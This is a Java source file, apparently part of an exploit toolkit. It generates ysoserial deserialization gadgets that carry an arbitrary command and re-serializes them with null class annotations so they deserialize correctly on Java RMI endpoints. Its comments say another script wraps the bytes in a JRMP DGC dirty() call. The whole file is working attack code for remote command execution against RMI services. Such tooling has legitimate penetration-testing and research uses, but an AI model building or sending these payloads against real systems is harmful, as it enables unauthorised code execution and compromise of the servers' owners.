import java.io.*;
import java.lang.reflect.*;

/**
 * MarshalSerializer — re-serializes a ysoserial gadget via MarshalOutputStream.
 *
 * Problem: ysoserial generates payloads using plain ObjectOutputStream which
 * writes empty class annotations (TC_ENDBLOCKDATA only). Java RMI's
 * MarshalInputStream.resolveClass() calls readObject() to read the codebase
 * annotation, but when it reads TC_ENDBLOCKDATA with no object before it the
 * call fails or causes stream de-synchronization, breaking deserialization.
 *
 * Solution: MarshalOutputStream.annotateClass() writes TC_NULL for each class
 * annotation. MarshalInputStream reads this as a null codebase URL and
 * continues normally, allowing the gadget to deserialize correctly.
 *
 * Usage: java -cp <lib_dir>:<ysoserial.jar> MarshalSerializer <gadget> <command>
 * Output: raw OOS stream (ACED0005 + marshaled object) written to stdout.
 *
 * The caller (build_dgc_dirty_call in jrmp.py) strips the ACED0005 header and
 * wraps the remaining bytes in the JRMP MSG_CALL / DGC dirty() call structure.
 */
public class MarshalSerializer {

    public static void main(String[] args) throws Exception {
        if (args.length < 2) {
            System.err.println("Usage: MarshalSerializer <gadget> <command>");
            System.exit(1);
        }
        String gadget  = args[0];
        String command = args[1];

        // Build gadget object via ysoserial reflection
        Class<?> payloadClass = Class.forName("ysoserial.payloads." + gadget);
        Method getObject = payloadClass.getDeclaredMethod("getObject", String.class);
        getObject.setAccessible(true);
        Object payload = getObject.invoke(payloadClass.newInstance(), command);

        // Serialize via MarshalOutputStream so that annotateClass() writes
        // TC_NULL (0x70) for every class, matching what JRMPClient sends.
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream mos = new MarshalOutputStream(baos);
        mos.writeObject(payload);
        mos.flush();

        // Output: ACED0005 + marshaled object bytes (no JRMP wrapper).
        // build_dgc_dirty_call() will strip ACED0005 and wrap in MSG_CALL.
        System.out.write(baos.toByteArray());
        System.out.flush();
    }

    /**
     * MarshalOutputStream that writes TC_NULL as class annotation for every class.
     * Mirrors sun.rmi.server.MarshalOutputStream / ysoserial JRMPClient inner class.
     */
    private static class MarshalOutputStream extends ObjectOutputStream {
        MarshalOutputStream(OutputStream out) throws IOException {
            super(out);
        }

        @Override
        protected void annotateClass(Class<?> cl) throws IOException {
            writeObject(null);   // TC_NULL (0x70) — null codebase URL
        }

        @Override
        protected void annotateProxyClass(Class<?> cl) throws IOException {
            writeObject(null);
        }
    }
}
